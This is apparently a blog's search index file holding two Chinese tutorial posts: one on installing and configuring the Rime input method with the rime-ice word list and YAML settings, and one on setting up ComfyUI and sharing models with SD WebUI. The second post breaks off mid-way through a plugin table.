<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>可高度自定义的开源输入法：Rime 配置与使用</title>
      <link href="/posts/1790572592/"/>
      <url>/posts/1790572592/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>主流的输入法能根据我的输入习惯自动优化，用起来方便不少。但我不知道它们是否真的“老实”和“准确”——毕竟那些公司也不是做慈善的。</p><p>虽说在互联网时代讲“隐私”有点奢侈了，但总比什么不做来得强；而且它们给的配置有限，我不能保证它涵盖了我所有的需求。</p><p>所以接下来，让我们有请：</p><center>RIME | 中州韵输入法引擎</center><h2 id="这是什么">这是什么</h2><p><a href="https://rime.im/" rel="external nofollow noreferrer">Rime</a> 是一个开源的输入法引擎，它允许你高度自定义输入法的行为，简介流畅。你可以用它来创建自己的输入法方案，也可以用它来修改现有的方案，或者使用第三方开发者的方案。</p><p>但是，它只是一个输入法引擎，并非“装完就能用”的类型。“自定义程度高”，是它的优点，也是缺点。它的配置项很丰富，以至于你可以按照自己的习惯对其深度定制，也意味着，你需要花费一些时间来了解它的配置项，以及如何使用它。而且，词库方面完善度和更新可能不及主流输入法。</p><p>如果你能找到一个合适的词库方案，并做了一定的设置，那么使用起来不亚于那些主流的输入法。</p><p>在不同平台，有开发者基于 Rime 开发了不同的输入法程序。</p><table><thead><tr><th>软件</th><th>适用平台</th></tr></thead><tbody><tr><td><a href="https://github.com/rime/weasel/releases/latest" rel="external nofollow noreferrer">小狼毫</a></td><td>Windows</td></tr><tr><td><a href="https://github.com/rime/squirrel/releases/latest" rel="external nofollow noreferrer">鼠须管</a></td><td>MacOS</td></tr><tr><td><a href="https://github.com/osfans/trime" rel="external nofollow noreferrer">同文</a></td><td>Android</td></tr><tr><td>ibus-rime</td><td>Linux（<a href="https://github.com/rime/home/wiki/RimeWithIBus" rel="external nofollow noreferrer">各 Linux 发行版发行说明</a>）</td></tr></tbody></table><p>虽然名称、外观、安装方式不同，但它们的配置文件是通用的。习惯了一个平台的配置，在其他平台也能用。</p><p>接下来以 Windows 平台为例。</p><h2 id="安装与配置">安装与配置</h2><p>前往 <a href="https://rime.im/" rel="external nofollow noreferrer">https://rime.im/</a> 下载安装包，双击安装文件，设置好安装路径和用户数据目录，“安装”即可。即将完成时，会有一个窗口（也可以在后续通过开始菜单的<code>【小狼毫】输入法设定</code>设置）。此步可以暂时不管。</p><p><img src="https://s2.loli.net/2025/08/12/UBjbn8AeflTMXuG.png" alt=""></p><p><img src="https://s2.loli.net/2025/08/12/BFPcO6qkfp4YQCH.png" alt=""></p><p>安装完成后，可通过<code>Ctrl+Shift</code>选择并激活输入法程序（不放心的可以安装完后重启一下系统）。</p><p>此时输入法还需要设置词库和方案。在开始菜单中找到<code>【小狼毫】用户文件夹</code>。默认情况下，它位于<code>C:\Users\【用户名】\AppData\Roaming\Rime</code>，里面有默认的配置文件。其他平台如下：</p><table><thead><tr><th>平台</th><th>路径</th></tr></thead><tbody><tr><td>小狼毫（Windows）</td><td><code>%AppData%\Rime</code></td></tr><tr><td>鼠须管（macOS）</td><td><code>~/Library/Rime/</code></td></tr><tr><td>中州韵（Linux）</td><td><code>~/.config/【ibus 或 fcitx】/rime</code></td></tr><tr><td>同文（Android）</td><td><code>/sdcard【即“文件管理”进入的根目录】/rime</code></td></tr></tbody></table><p>如果设置了其他的目录，或是在后续通过<code>【小狼毫】安装选项</code>设置了用户目录，则此处打开的目录下文件可能有所不同。后续配置的第三方词库等，都在<code>用户目录</code>中进行操作（例如你设置用户目录在<code>D:\Rime\UserData</code>，那么后续就在这里配置第三方词库，而不是回到 C 盘）。</p><p>回到正题。对于 Windows 平台，打开<code>【小狼毫】输入法设定</code>，在提供的几个方案中选择一个方案，并勾选复选框，之后点击<code>【保存】</code>（有些情况下可能显示“中”字）。然后进入。然后点击<code>【小狼毫】重新部署</code>（或者在切换为小狼毫时，右键系统托盘的 Rime 图标，点击<code>重新部署（R）</code>）。所有的修改都需要重新部署后才能生效。</p><p>这些界面也可以通过右键系统托盘的 Rime 图标找到相应的入口进入。</p><p><img src="https://s2.loli.net/2025/08/12/LTpaSdXbYINicse.png" alt=""></p><h2 id="第三方词库">第三方词库</h2><p>此处我以<code>雾凇拼音</code>为例作说明。</p><p>前往 <a href="https://github.com/iDvel/rime-ice" rel="external nofollow noreferrer">https://github.com/iDvel/rime-ice</a> 下载最新的词库包，并将其解压至用户文件夹中。或者，使用 Git 进行管理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iDvel/rime-ice.git 【用户文件夹】</span><br></pre></td></tr></table></figure><p>不需要新建目录，直接把下载下来的文件直接放到此目录下。如果该目录下已经有别的文件，无需在意，覆盖了就行。</p><p>随后，重新部署 Rime（首次部署时间可能较长，请耐心等待），完成后进入<code>【小狼毫】输入法设定</code>，根据自己选择的方案勾选对应的复选框（不需要的方案可以取消勾选），而后保存即可。</p><p><img src="https://s2.loli.net/2025/08/12/wDBiTtCqu4k8VZO.png" alt=""></p><p>其他平台同理（Android 端的<code>同文输入法</code>可能需要在<code>配置</code>-&gt;<code>用户文件夹</code>中手动指定目录，然后将方案直接放到此目录下，再回到主界面点击<code>部署</code>，随后在<code>方案</code>中选择对应的方案。可能需要等待一会，让输入法识别到新的方案）。</p><p>某些情况下，<code>部署</code>和设置可以换一下顺序，但建议最后还是重新部署一下。</p><h2 id="常用设置">常用设置</h2><p>以下同样以<code>雾凇拼音</code>为例，不同方案的配置项可能存在细微差异。</p><p>打开用户文件夹，找到<code>default.yaml</code>文件并编辑。</p><p><strong>编辑完并重新部署后，配置才生效。</strong></p><h3 id="菜单快捷键">菜单快捷键</h3><p>使用快捷键 Ctrl + `（键盘左上角的反引号，位于数字<code>1</code>左侧）可以打开设置菜单。也可以找个输入框并按<code>F4</code>键，也可以打开菜单。</p><p>也可以找到热键设置自定义：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方案选单相关</span></span><br><span class="line"><span class="attr">switcher:</span></span><br><span class="line">  <span class="attr">caption:</span> <span class="string">「方案选单」</span></span><br><span class="line">  <span class="attr">hotkeys:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">F4</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Control+grave</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Control+Shift+grave</span></span><br><span class="line">    <span class="comment"># - Alt+grave</span></span><br><span class="line">  <span class="attr">save_options:</span>  <span class="comment"># 开关记忆（方案中的 switches），从方案选单（而非快捷键）切换时会记住的选项，需要记忆的开关不能设定 reset</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ascii_punct</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">traditionalization</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">emoji</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">full_shape</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">search_single_char</span></span><br><span class="line">  <span class="attr">fold_options:</span> <span class="literal">true</span>            <span class="comment"># 呼出时是否折叠，多方案时建议折叠 true ，一个方案建议展开 false</span></span><br><span class="line">  <span class="attr">abbreviate_options:</span> <span class="literal">true</span>      <span class="comment"># 折叠时是否缩写选项</span></span><br><span class="line">  <span class="attr">option_list_separator:</span> <span class="string">&#x27; / &#x27;</span>  <span class="comment"># 折叠时的选项分隔符</span></span><br></pre></td></tr></table></figure><h3 id="候选词数量">候选词数量</h3><p>雾凇拼音默认候选词为 5 个，如果需要修改，可以找到菜单：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 菜单</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">page_size:</span> <span class="number">7</span>  <span class="comment"># 候选词个数</span></span><br><span class="line">  <span class="comment"># alternative_select_labels: [ ①, ②, ③, ④, ⑤, ⑥, ⑦, ⑧, ⑨, ⑩ ]  # 修改候选项标签</span></span><br><span class="line">  <span class="comment"># alternative_select_keys: ASDFGHJKL  # 如编码字符占用数字键，则需另设选字键（注意在雾凇中，大写字母也作为编码了）</span></span><br></pre></td></tr></table></figure><h2 id="外观">外观</h2><p>（这部分的配置可能不是全平台通用的，且需注意配置文件名称的差异，但配置文件放置的位置基本相同。）</p><p>在用户文件夹中找到<code>weasel.custom.yaml</code>并编辑（有的可能只有<code>weasel.yaml</code>，那就自己创建一个，使用 UTF-8 编码）。</p><p>值得注意的是，它的配色用的不是 RGB，而是 BGR。如果担心改不好可以用其他开发者提供的工具，例如 <a href="https://owlzou.github.io/weasel-theme-editor/" rel="external nofollow noreferrer">weasel-theme-editor</a>、<a href="https://bennyyip.github.io/Rime-See-Me/" rel="external nofollow noreferrer">RIME 西米</a>、<a href="https://gjrobert.github.io/Rime-See-Me-squirrel/" rel="external nofollow noreferrer">RIME 西米 for 鼠须管</a> 等。</p><p>修改后，这段代码大致如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">style:</span></span><br><span class="line">    <span class="attr">color_scheme:</span> <span class="string">example1</span> <span class="comment"># 应用皮肤名称</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">preset_color_schemes:</span></span><br><span class="line">    <span class="attr">example1:</span> <span class="comment"># 皮肤名称</span></span><br><span class="line">      <span class="comment"># 具体配置项</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">example2:</span> <span class="comment"># 可以自定义多个配置项</span></span><br><span class="line">      <span class="comment"># 具体配置项</span></span><br></pre></td></tr></table></figure><p>前面那一段，因方案不同，写法可能存在差异，但可以改写。例如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">&quot;style/color_scheme&quot;:</span> <span class="string">flypy</span></span><br></pre></td></tr></table></figure><p>写成这样也是可以的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">style:</span></span><br><span class="line">    <span class="attr">color_scheme:</span> <span class="string">flypy</span></span><br></pre></td></tr></table></figure><p>两种写法都是允许的，后续不再赘述。</p><p>大部分配置项可以通过字面意思来理解，这里挑选几个说明：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">style:</span></span><br><span class="line">    <span class="comment"># 基础设置</span></span><br><span class="line">    <span class="attr">color_scheme:</span> <span class="string">succulent_plant</span>  <span class="comment"># 使用名为 &quot;succulent_plant&quot; 的预定义配色方案（需在主题文件中定义）</span></span><br><span class="line">    <span class="attr">font_face:</span> <span class="string">Microsoft</span> <span class="string">YaHei</span>    <span class="comment"># 候选词字体：微软雅黑</span></span><br><span class="line">    <span class="attr">font_point:</span> <span class="number">12</span>                <span class="comment"># 候选词字号：12 磅</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 布局模式</span></span><br><span class="line">    <span class="attr">horizontal:</span> <span class="literal">true</span>              <span class="comment"># 候选窗横向排列（false 为纵向）</span></span><br><span class="line">    <span class="attr">fullscreen:</span> <span class="literal">false</span>             <span class="comment"># 禁用全屏模式（适用于平板场景）</span></span><br><span class="line">    <span class="attr">inline_preedit:</span> <span class="literal">true</span>          <span class="comment"># 编码输入区（预编辑文本）跟随光标显示（非固定位置）</span></span><br><span class="line">    <span class="attr">preedit_type:</span> <span class="string">composition</span>     <span class="comment"># 预编辑文本显示为合成模式（单行显示，composition 或 preview）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 界面元素</span></span><br><span class="line">    <span class="attr">display_tray_icon:</span> <span class="literal">false</span>      <span class="comment"># 不在系统托盘显示 Rime 图标</span></span><br><span class="line">    <span class="attr">label_format:</span> <span class="string">&#x27;%s.&#x27;</span>           <span class="comment"># 候选词序号格式：数字 + 点（如 &quot;1.&quot;，&quot;2.&quot;）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 窗口布局参数</span></span><br><span class="line">    <span class="attr">layout:</span>  <span class="comment"># 窗口布局高级参数</span></span><br><span class="line">      <span class="attr">min_width:</span> <span class="number">100</span>      <span class="comment"># 候选窗最小宽度（像素）</span></span><br><span class="line">      <span class="attr">min_height:</span> <span class="number">0</span>       <span class="comment"># 候选窗最小高度（0 表示自动）</span></span><br><span class="line">      <span class="attr">border_width:</span> <span class="number">3</span>     <span class="comment"># 窗口边框粗细（像素）</span></span><br><span class="line">      <span class="attr">margin_x:</span> <span class="number">10</span>        <span class="comment"># 窗口水平外间距（左右留白）</span></span><br><span class="line">      <span class="attr">margin_y:</span> <span class="number">10</span>        <span class="comment"># 窗口垂直外间距（上下留白）</span></span><br><span class="line">      <span class="attr">spacing:</span> <span class="number">10</span>         <span class="comment"># 候选词之间的水平间距（像素）</span></span><br><span class="line">      <span class="attr">candidate_spacing:</span> <span class="number">20</span>  <span class="comment"># 候选词与注释文字间距（像素）</span></span><br><span class="line">      <span class="attr">hilite_spacing:</span> <span class="number">5</span>   <span class="comment"># 高亮候选框与边框的间距（像素）</span></span><br><span class="line">      <span class="attr">hilite_padding:</span> <span class="number">10</span>  <span class="comment"># 高亮候选框内边距（文字到框线的距离）</span></span><br><span class="line">      <span class="attr">round_corner:</span> <span class="number">0</span>     <span class="comment"># 窗口圆角半径（0 为直角）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 补充常见视觉参数</span></span><br><span class="line">    <span class="attr">translucency:</span> <span class="literal">true</span>             <span class="comment"># 启用透明度效果</span></span><br><span class="line">    <span class="attr">alpha:</span> <span class="number">0.95</span>                    <span class="comment"># 整体透明度（0.0 透明~1.0 不透明）</span></span><br><span class="line">    <span class="attr">corner_radius:</span> <span class="number">8</span>               <span class="comment"># 窗口圆角（需 round_corner&gt;0 生效）</span></span><br><span class="line">    <span class="attr">line_spacing:</span> <span class="number">1.3</span>              <span class="comment"># 行距倍数</span></span><br><span class="line">    <span class="attr">comment_font_point:</span> <span class="number">10</span>         <span class="comment"># 注释文字字号</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 覆盖配色</span></span><br><span class="line">    <span class="attr">color_scheme_overrides:</span></span><br><span class="line">      <span class="attr">text_color:</span> <span class="number">0x333333</span>        <span class="comment"># 普通候选词颜色（BGR 格式，下同）</span></span><br><span class="line">      <span class="attr">back_color:</span> <span class="number">0xFFFFFF</span>        <span class="comment"># 背景色（需开启透明度）</span></span><br><span class="line">      <span class="attr">hilited_text_color:</span> <span class="number">0x2681E8</span> <span class="comment"># 高亮候选词颜色</span></span><br><span class="line">      <span class="attr">hilited_back_color:</span> <span class="number">0xEDF7FF</span> <span class="comment"># 高亮候选背景色</span></span><br><span class="line">      <span class="attr">border_color:</span> <span class="number">0xD0D0D0</span>      <span class="comment"># 边框颜色</span></span><br></pre></td></tr></table></figure><p>至于自定义方案，官方示例中，Windows 平台的<code>weasel.custom.yaml</code>中有以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">&quot;style/color_scheme&quot;:</span> <span class="string">starcraft</span>    <span class="comment"># 這項用於選中下面定義的新方案</span></span><br><span class="line">  <span class="attr">&quot;preset_color_schemes/starcraft&quot;:</span>  <span class="comment"># 在配色方案列表裏加入標識爲 starcraft 的新方案</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">星際我爭霸／StarCraft</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">Contralisk</span> <span class="string">&lt;contralisk@gmail.com&gt;,</span> <span class="string">original</span> <span class="string">artwork</span> <span class="string">by</span> <span class="string">Blizzard</span> <span class="string">Entertainment</span></span><br><span class="line">    <span class="attr">text_color:</span> <span class="number">0xccaa88</span>             <span class="comment"># 編碼行文字顏色，24 位色值，用十六進制書寫方便些，順序是藍綠紅 0xBBGGRR</span></span><br><span class="line">    <span class="attr">candidate_text_color:</span> <span class="number">0x30bb55</span>   <span class="comment"># 候選項文字顏色，當與文字顏色不同時指定</span></span><br><span class="line">    <span class="attr">back_color:</span> <span class="number">0x000000</span>             <span class="comment"># 底色</span></span><br><span class="line">    <span class="attr">border_color:</span> <span class="number">0x1010a0</span>           <span class="comment"># 邊框顏色，與底色相同則爲無邊框的效果</span></span><br><span class="line">    <span class="attr">hilited_text_color:</span> <span class="number">0xfecb96</span>     <span class="comment"># 高亮文字，即與當前高亮候選對應的那部份輸入碼</span></span><br><span class="line">    <span class="attr">hilited_back_color:</span> <span class="number">0x000000</span>     <span class="comment"># 設定高亮文字的底色，可起到凸顯高亮部份的作用</span></span><br><span class="line">    <span class="attr">hilited_candidate_text_color:</span> <span class="number">0x60ffa8</span>  <span class="comment"># 高亮候選項的文字顏色，要醒目！</span></span><br><span class="line">    <span class="attr">hilited_candidate_back_color:</span> <span class="number">0x000000</span>  <span class="comment"># 高亮候選項的底色，若與背景色不同就會顯出光棒</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/08/12/1kN258DMhmFfxGz.png" alt=""></p><p>更多内容详见：<a href="https://github.com/rime/home/wiki/CustomizationGuide" rel="external nofollow noreferrer">CustomizationGuide Rime 定製指南</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 体验推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 输入法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灵活的 AI 工作流：ComfyUI 上手使用</title>
      <link href="/posts/2709533729/"/>
      <url>/posts/2709533729/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>（其实是2024年底写的，但我使用时遇到个问题，一直未能解决。再加上当时因为一些事情，遂致此文拖至现在才更新……）</p><p>或许是我现在使用的设备确实有点老了，也可能是我的配置方法不对，RWKV 生成音乐，但效果比较奇怪；MusicGPT 一键包运行后，卡在那不动了。AudioCraft 看着效果不错，但官方推荐配置给我劝退了，至少现在我还用不来。Stability AI 有个 Stable Audio，但我安装后却跑不起来（可能我的配置确实太低了）。</p><p>好像有人把 Stable Audio Open 做成了 ComfyUI 组件。当时我对 ComfyUI 的认识停留在“一个和 WebUI 外观不同的绘图工具”上，觉得多装一个 ComfyUI 是不是重复了……</p><p>结果，某次我启动完几个必要的软件后，SD WebUI 出图卡死了，Forge 亦然。emmm……看来我确实应该尝试一下新东西了。</p><p>（感觉有很多新的插件，优先适配的是 ComfyUI 而非 WebUI。）</p><h2 id="对比-WebUI">对比 WebUI</h2><p>对于使用 AI 绘图的玩家而言，Stable Diffusion WebUI 算是比较知名的程序了，此处不再赘述。先来看看二者的区别：</p><p><img src="https://s2.loli.net/2024/12/29/uk3b9ZQxgWJfRT8.png" alt=""></p><p>可以很直观地看到，WebUI 的各配置项一目了然。借用网上一篇文章的话来形容：WebUI 相当于一体机，许多功能已经集成好；ComfyUI 相对于自由组装的电脑，所有配件按需准备、自由组装，可以通过搭配得到各式各样的“电脑”。</p><p>你需要什么功能，找到它并调整参数即可，上手难度比较低。但仅靠调整参数，局限性比较大，且一点微小的差异都可能导致与预期结果有不小的差别。那么 ComfyUI 这颗于 2023 下半年升起的“新星”呢？</p><p><img src="https://s2.loli.net/2024/12/29/MFEXYzg1l9Kxrco.png" alt=""></p><p>如果你使用过 DaVinci Resolve、Maya、Unity 之类的软件，或许对这种界面比较熟悉，但对于没接触过工作流的人而言，入门门槛相对较高。不过熟悉这种节点式的界面和工作流后，其可玩性会更好（例如生成图像、视频、3D，甚至语言模型、音乐等）。得益于其工作流的设计，你可以很方便地保存和复现自己或别人的工作流程（你甚至不必理解整个工作流的细节）。</p><p>总而言之：</p><table><thead><tr><th>特性</th><th>SD-Webui</th><th>ComfyUI</th></tr></thead><tbody><tr><td>界面</td><td>界面简洁，易于导航，适合初学者</td><td>界面相对复杂，提供更多自定义选项</td></tr><tr><td>配置</td><td>要求较高（官方建议最低 4GB；Forge 版是第三方的，对配置要求更低，但存在兼容性问题）</td><td>要求较低（3GB 显存即可运行）</td></tr><tr><td>性能</td><td>占用资源较多，出图略慢</td><td>性能优化较好，适合高性能需求用户</td></tr><tr><td>功能</td><td>功能全面，可以满足大多数图像生成需求</td><td>功能更丰富，生成内容不仅限于图像</td></tr><tr><td>社区与扩展</td><td>社区活跃，生态丰富，可扩展性好</td><td>经过发展，社区支持也较完善，插件丰富，但兼容性稍低</td></tr><tr><td>上手难度</td><td>配置相对简单，教程和社区支持丰富，适合入门</td><td>配置灵活，但这需要一定的技术，学习曲线陡峭</td></tr></tbody></table><p>（注：上手 ComfyUI 建议做好经常与红紫框、报错的心理准备。但这或许不是它的缺点）</p><p>这是一个。但是，<a href="https://www.comfy.org" rel="external nofollow noreferrer">comfy.org</a> 官网上有这样一句话：</p><blockquote><p>Crafting the next frontier of visual and audio media</p></blockquote><p>又看了 GitHub 上的 README：</p><blockquote><p>The most powerful and modular diffusion model GUI and backend</p></blockquote><p>如果你见过用过的节点足够丰富，你会注意到有些节点似乎不是为 SD 生成图片而设计的（当然，它们可能也不是 3GB 显存能用的了）。</p><h2 id="安装与配置">安装与配置</h2><p>进入 <a href="https://github.com/comfyanonymous/ComfyUI" rel="external nofollow noreferrer">comfyanonymous/ComfyUI</a> 页面，按照自己的设备选择合适的方式安装。开发者已经制作了 Windows 系统下的可移植包（NVIDIA 显卡运行或仅 CPU 运行），可以点击 <a href="https://github.com/comfyanonymous/ComfyUI/releases/latest/download/ComfyUI_windows_portable_nvidia.7z" rel="external nofollow noreferrer">Direct link to download</a> 进行下载。</p><p>Windows 用户还可以使用第三方一键包，例如秋葉 aaaki 的 <a href="https://www.bilibili.com/video/av326388194/" rel="external nofollow noreferrer">ComfyUI 整合包</a>（话说后来玩 AI 绘图的应该也都认识这位 UP 主了罢）；也可以下载官方可移植包后使用绘世启动器进行管理，把启动器文件放到<code>ComfyUI</code>目录下（官方一键包也是这个目录）然后启动，等待启动器初始化即可。</p><p>程序的详细安装过程见官方仓库中的介绍。我使用了一键包，Windows 下不敢手动配置，起码目前不敢 <s>（不知为何，Python 在我目前的设备上“水土不服”，总能给我整出些大动静）</s> ，但手动配置比一键包的稳定性好。</p><p>之后进入 ComfyUI 根目录中的 Model 目录，这是存放 ComfyUI 模型的地方。只配置图像生成模型，只需关注 checkpoints（检查点模型，即“大模型”）、Loras（LORA 模型）、controlnet 、vae 这些文件夹。只需要进入对应的文件夹，把匹配的模型放入，程序便能自动加载。没有模型？请自行前往 <a href="https://civitai.com/" rel="external nofollow noreferrer">Civitai</a>（没有网络条件的可以访问 <a href="https://civitai.work/support" rel="external nofollow noreferrer">Civitai 中国镜像</a>，但不要直接访问镜像站本体域名，需要在后面带上路径（无论是否存在），否则无法加载）或 <a href="https://huggingface.co/" rel="external nofollow noreferrer">HuggingFace</a>，找寻合适的模型下载。</p><p>但是，如果你已经使用一段时间 WebUI 了，或者希望将其与 WebUI 共存，那么模型怎么办？ComfyUI 是支持共享 WebUI 模型的，在根目录下找到一个名为<code>extra_model_paths.yaml.example</code>的文件，将其后缀<code>.example</code>去除（修改后扩展名应为<code>yaml</code>）并编辑（建议复制一份后再改后缀）。这里演示检查点模型和 controlnet 模型路径的配置方法，具体路径请根据自己的情况变通。</p><p>（请注意，yaml 文件对缩进敏感；由于复制时可能存在格式问题，此处只需关注删增行的缩进。这里使用的 diff 代码块中，部分行最前面的加减号是用于标记添加或删除的，在实际修改或添加内容时，需要将其去除，去除标记后的代码缩进是正确的。删增行后的注释仅作说明作用，可以不用复制。另外，由于我在 Windows 上使用，此处绝对路径部分使用了反斜杠，Linux 用户可能需使用普通的斜杠）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 省略。..</span><br><span class="line"></span><br><span class="line"># config for a1111 ui</span><br><span class="line"># all you have to do is change the base_path to where yours is installed</span><br><span class="line">a111:</span><br><span class="line"><span class="deletion">-    base_path: path/to/stable-diffusion-webui/</span></span><br><span class="line"><span class="addition">+    base_path: E:\SD-WebUI # 假设你的 SD-WebUI 在 E 盘的根目录下，下同</span></span><br><span class="line"></span><br><span class="line">    checkpoints: models/Stable-diffusion</span><br><span class="line">    configs: models/Stable-diffusion</span><br><span class="line">    vae: models/VAE</span><br><span class="line">    loras: |</span><br><span class="line">         models/Lora</span><br><span class="line">         models/LyCORIS</span><br><span class="line">    upscale_models: |</span><br><span class="line">                  models/ESRGAN</span><br><span class="line">                  models/RealESRGAN</span><br><span class="line">                  models/SwinIR</span><br><span class="line">    embeddings: embeddings</span><br><span class="line">    hypernetworks: models/hypernetworks</span><br><span class="line"><span class="deletion">-    controlnet: models/ControlNet</span></span><br><span class="line"><span class="addition">+    controlnet: E:\SD-WebUI\models\ControlNet # 默认情况下，在 SD-WebUI 中的 controlnet 模型路径应如此；还有一种可能是在 E:\SD-WebUI\extensions\sd-webui-controlnet\models 中。</span></span><br><span class="line"></span><br><span class="line"># config for comfyui</span><br><span class="line"># your base path should be either an existing comfy install or a central folder where you store all of your models, loras, etc.</span><br><span class="line"></span><br><span class="line"># 省略。..</span><br></pre></td></tr></table></figure><p>一切准备妥当后，启动程序（使用绘世启动器管理的，点击主页面<code>一键启动</code>），等待程序完成初始化环境配置后，在浏览器中输入<code>http://127.0.0.1:8188/</code>，若 ComfyUI 正常加载则启动成功。</p><p>秋叶的整合包已经预配置了一些常用节点和界面汉化，可以更快速地上手使用。之后的演示也是使用该整合包进行。另外，在 2024 年 7 月初，ComfyUI 官方更新了新的 UI 界面（可以设置回旧 UI），因此下文的示例将基于新版 UI 进行。</p><p>有些实用的插件可以一起安装了：</p><table><thead><tr><th>名称和链接</th><th>功能简介</th></tr></thead><tbody><tr><td><a href="https://github.com/ltdrdata/ComfyUI-Manager" rel="external nofollow noreferrer">ComfyUI-Manager</a></td><td>增强 ComfyUI 的可用性，便于管理自定义节点、更新程序、查阅手册等</td></tr><tr><td><a href="https://github.com/AIGODLIKE/AIGODLIKE-ComfyUI-Translation" rel="external nofollow noreferrer">AIGODLIKE-ComfyUI-Translation</a></td><td>多语言翻译插件，对 ComfyUI 做了较完善的汉化</td></tr><tr><td><a href="https://github.com/thisjam/comfyui-sixgod_prompt" rel="external nofollow noreferrer">comfyui-sixgod_prompt</a></td><td>类似于 SD-WebUI 中的 prompt-all-in-one，便于输入提示词。还有一个功能相似的插件 <a href="https://github.com/weilin9999/WeiLin-ComfyUI-prompt-all-in-one" rel="external nofollow noreferrer">WeiLin-ComfyUI-prompt-all-in-one</a></td></tr><tr><td><a href="https://github.com/Fannovel16/comfyui_controlnet_aux" rel="external nofollow 